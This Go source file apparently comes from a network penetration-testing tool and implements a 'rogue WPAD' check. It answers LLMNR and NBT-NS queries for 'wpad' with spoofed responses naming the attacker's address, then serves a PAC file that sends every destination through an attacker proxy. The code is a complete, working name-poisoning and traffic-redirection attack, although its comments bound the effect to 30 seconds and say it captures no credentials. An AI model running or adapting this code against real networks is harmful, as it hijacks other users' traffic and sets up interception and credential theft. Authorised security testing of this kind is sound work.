// wpad.go implements the rogue WPAD check. Impact temporary, restore decay
// with a 30 s bound, affects clients: the NBT-NS or LLMNR answer points
// the client that asked at the attack leg's IPv4 for the wpad name with a
// 30 s TTL, after which the client asks again. The PAC listener binds the
// attack leg's IPv4 on port 80 and closes before the behavior returns, so
// the answer serves nothing to a client once the run moves on. The HTTP
// handler does not capture authentication exchanges or forward proxy
// traffic.

package routing

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"strconv"
	"sync"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/common/spawn"
	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/catalog"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
)

// wpadPacTTL is the decay bound: clients re-fetch the PAC after this TTL.
const wpadPacTTL = 30 // seconds

// wpadPacPath is the path a client fetches the PAC from.
const wpadPacPath = "/wpad.dat"

// wpadFinding is the finding detail for the WPAD behavior.
type wpadFinding struct {
	Action string `json:"action"`
	Query  string `json:"query"`
	Answer string `json:"answer"`
	TTL    int    `json:"ttl"`
	Port   int    `json:"port"`
}

// wpadState holds the embedded proxy's runtime state: the listener, its
// port, the server, and the request log the handler appends to.
type wpadState struct {
	listener net.Listener
	port     int
	server   *http.Server

	mu       sync.Mutex
	requests []string
	fetched  chan struct{} // closed on the first request for the PAC path
	once     sync.Once
}

// log records one request path and signals the first PAC fetch.
func (s *wpadState) log(path string) {
	s.mu.Lock()
	s.requests = append(s.requests, path)
	s.mu.Unlock()
	if path == wpadPacPath {
		s.once.Do(func() { close(s.fetched) })
	}
}

// RunWPAD opens the PAC listener on the attack leg's IPv4, port 80, waits
// for an NBT-NS or LLMNR query for the wpad name within the window,
// answers it unicast to the query's source MAC, IPv4, and UDP port with
// the query's id and the leg's IPv4, and reads the listener's request log.
// The behavior reads no target. The predicate is a request for /wpad.dat
// on the listener: one within the window confirms that a client fetched
// the PAC, a query answered without one resists, and no query within the
// window is pending with nothing sent. A bind failure carries
// [catalog.ErrCodeWPADPortCollision]. Concurrent calls require separate
// dependencies.
func RunWPAD(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	addr := deps.AttackLeg.Addr()
	qname := "wpad"
	answerIP := addr.IPv4

	state, err := startWPADProxy(ctx, deps.Listen, net.JoinHostPort(answerIP.String(), "80"))
	if err != nil {
		// Port collision: named coded error, not a crash.
		return check.Verdict{}, errs.New().
			Code(catalog.ErrCodeWPADPortCollision).
			UserMsg("WPAD proxy port collision").
			Hint("free port 80 on the attack leg's address").
			Msgf("wpad: bind proxy listener: %v", err)
	}
	defer func() {
		_ = state.server.Close()
		_ = state.listener.Close()
	}()

	var query wpadQuery
	found, pre, err := check.First(ctx, deps.AttackLeg, deps.Observe, func(data []byte) bool {
		q, ok := isWPADQuery(data, addr.MAC)
		if ok {
			query = q
		}
		return ok
	})
	if err != nil {
		if ctx.Err() != nil {
			return check.Verdict{}, ctx.Err()
		}
		return check.Verdict{}, errs.Wrap(err, "wpad: receive query")
	}
	if found == nil {
		return check.Pending(fmt.Sprintf("no wpad query in %s", pre.Elapsed.Round(time.Millisecond))), nil
	}

	var answer []byte
	if query.llmnr {
		answer, err = craftLLMNRResponse(addr.MAC, query, qname, answerIP)
	} else {
		answer, err = craftNBTNSResponse(addr.MAC, query, qname, answerIP)
	}
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "wpad: craft answer")
	}
	if err := deps.AttackLeg.Send(ctx, answer); err != nil {
		return check.Verdict{}, errs.Wrap(err, "wpad: send answer")
	}

	detail := wpadFinding{
		Action: "wpad-rogue-proxy",
		Query:  qname,
		Answer: answerIP.String(),
		TTL:    wpadPacTTL,
		Port:   state.port,
	}
	detailBytes, _ := json.Marshal(detail)
	deps.Emitter.Finding("wpad", detailBytes)

	remaining := deps.Observe - pre.Elapsed
	timer := time.NewTimer(remaining)
	defer timer.Stop()
	start := time.Now()
	select {
	case <-ctx.Done():
		return check.Verdict{}, ctx.Err()
	case <-state.fetched:
		return check.Confirmed("a client fetched the PAC", pre.Elapsed+time.Since(start)), nil
	case <-timer.C:
		return check.Resisted(fmt.Sprintf("no PAC fetch in %s", remaining.Round(time.Millisecond)), deps.Observe), nil
	}
}

// startWPADProxy starts an embedded HTTP server on a listener from listen
// bound to address, serving a TTL-bound PAC response and logging each
// request path. The PAC redirects all traffic to the attacker. ctx bounds
// only the goroutine that serves the listener, so a panic there is
// reported with the caller's trace correlation. Stopping the server itself
// means closing state.server and state.listener, not ctx.
func startWPADProxy(ctx context.Context, listen func(context.Context, string, string) (net.Listener, error), address string) (*wpadState, error) {
	ln, err := listen(ctx, "tcp", address)
	if err != nil {
		return nil, err
	}
	port := 0
	if tcp, ok := ln.Addr().(*net.TCPAddr); ok {
		port = tcp.Port
	}
	state := &wpadState{listener: ln, port: port, fetched: make(chan struct{})}

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		state.log(r.URL.Path)
		if r.URL.Path != wpadPacPath {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
		w.Header().Set("Cache-Control", "max-age="+strconv.Itoa(wpadPacTTL))
		// PAC: direct to attacker proxy for all destinations.
		pac := `function FindProxyForURL(url, host) { return "PROXY ` + r.Host + `"; }`
		_, _ = io.WriteString(w, pac)
	})

	state.server = &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 5 * time.Second,
		// The PAC body is a handful of bytes. A client that needs longer
		// than these bounds is stuck or hostile and would drain the lab
		// operator's process, so both directions are bounded.
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  30 * time.Second,
	}

	spawn.Go(ctx, "netpen wpad proxy serve", func() {
		// Serve returns ErrServerClosed once Close runs in the deferred
		// shutdown; nothing else reads that result.
		_ = state.server.Serve(ln)
	})

	return state, nil
}

// craftNBTNSResponse builds an NBT-NS response to q: Ethernet → IPv4 →
// UDP(137) → NBNS response with the attacker's IP as the answer for the
// name, sent unicast to the querier with the query's id. Uses the owned
// [nl.NBNS] layer.
func craftNBTNSResponse(src net.HardwareAddr, q wpadQuery, qname string, answerIP net.IP) ([]byte, error) {
	nbns := &nl.NBNS{
		ID:      q.id,
		Flags:   0x8500, // response, authoritative
		QDCount: 0,
		ANCount: 1,
		Answers: []nl.NBNSResourceRecord{
			{
				Name:  qname,
				Type:  0x0020, // NB type
				Class: 0x0001, // IN
				TTL:   wpadPacTTL,
				Data:  nbnsNodeAddress(answerIP),
			},
		},
	}

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       q.srcMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    answerIP,
		DstIP:    q.srcIP,
	}
	udp := &layers.UDP{
		SrcPort: 137,
		DstPort: q.srcPort,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft.Default(eth, ip, udp, nbns)
}

// nbnsNodeAddress builds the NBNS RDATA for a node status response: a
// 6-byte value (flags + IP address). See RFC 1002 §4.2.1.2.
func nbnsNodeAddress(ip net.IP) []byte {
	data := make([]byte, 6)
	data[0] = 0x00 // flags
	ip4 := ip.To4()
	copy(data[2:6], ip4)
	return data
}

// craftLLMNRResponse builds an LLMNR response to q: Ethernet → IPv4 →
// UDP(5355) → LLMNR response with the attacker's IP as the answer for the
// name, sent unicast to the querier with the query's id (RFC 4795 sections
// 2.1.1 and 2.3). Uses the owned [nl.LLMNR] layer.
func craftLLMNRResponse(src net.HardwareAddr, q wpadQuery, qname string, answerIP net.IP) ([]byte, error) {
	llmnr := &nl.LLMNR{
		ID:      q.id,
		Flags:   0x8000, // response
		QDCount: 0,
		ANCount: 1,
		Answers: []nl.LLMNRResourceRecord{
			{
				Name:  qname,
				Type:  1, // A record
				Class: 1, // IN
				TTL:   wpadPacTTL,
				Data:  answerIP.To4(),
			},
		},
	}

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       q.srcMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    answerIP,
		DstIP:    q.srcIP,
	}
	udp := &layers.UDP{
		SrcPort: 5355,
		DstPort: q.srcPort,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft.Default(eth, ip, udp, llmnr)
}

// Compile-time assertions: the owned layers implement SerializableLayer.
var (
	_ gopacket.SerializableLayer = (*nl.NBNS)(nil)
	_ gopacket.SerializableLayer = (*nl.LLMNR)(nil)
)
